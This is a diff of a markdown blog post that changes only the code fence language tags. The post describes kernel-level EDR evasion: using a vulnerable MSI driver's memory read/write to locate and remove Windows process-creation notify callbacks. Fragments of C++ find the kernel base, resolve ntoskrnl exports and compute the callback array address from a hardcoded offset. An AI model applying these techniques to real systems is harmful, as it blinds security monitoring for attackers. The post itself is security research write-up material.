@@ -117,7 +117,7 @@ Let's write some code.
 If we want to enumerate and remove existing callbacks, we need to replicate these steps in our program. I will assume the vulnerable driver has already been loaded and we have a reliable memory read and write function.
 
 We start by using [EnumDeviceDrivers()](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers), part of the Process Status API, to retrieve the kernel base address. This is accessible in Medium integrity processes and can be used to retrieve the kernel base, as this is usually the first address to be returned. I've read that this is not 100% reliable, but so far I have not encountered any issues.
-```
+```c++
 DWORD64 Findkrnlbase() {
     DWORD cbNeeded = 0;
     LPVOID drivers[1024];
@@ -129,7 +129,7 @@ DWORD64 Findkrnlbase() {
     return NULL;
 ```
 Knowing the kernel base, we can now load `ntoskrnl.exe` using `LoadLibrary()` and find the addresses of some exported functions with `GetProcAddress()`. We'll calculate the offsets of these functions from the loaded kernel base, free ntoskrnl.exe and calculate the current memory addresses of these functions in memory based on the actual current kernel base in memory. This idea and code is based on the PPLKiller [code](https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/ConsoleApplication1/ConsoleApplication1.cpp) by RedCursor:
-```
+```c++
 const auto NtoskrnlBaseAddress = Findkrnlbase();
 
     HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
@@ -156,7 +156,7 @@ fffff802`235536b0  d233c28a`28ec8348
 It looks like the callback array lives at `PsSetCreateProcessNotifyRoutine + 0x24D810` in this version of Windows.
 
 Now, let's use our memory read functionality so kindly provided by the MSI driver and the author of the driver exploit, to retrieve and list these callback routines. We also add functionality to specify a callback function to be removed:
-```
+```c++
 const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress - 0x24D810;
 Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
 Log("[+] Enumerating process creation callbacks");
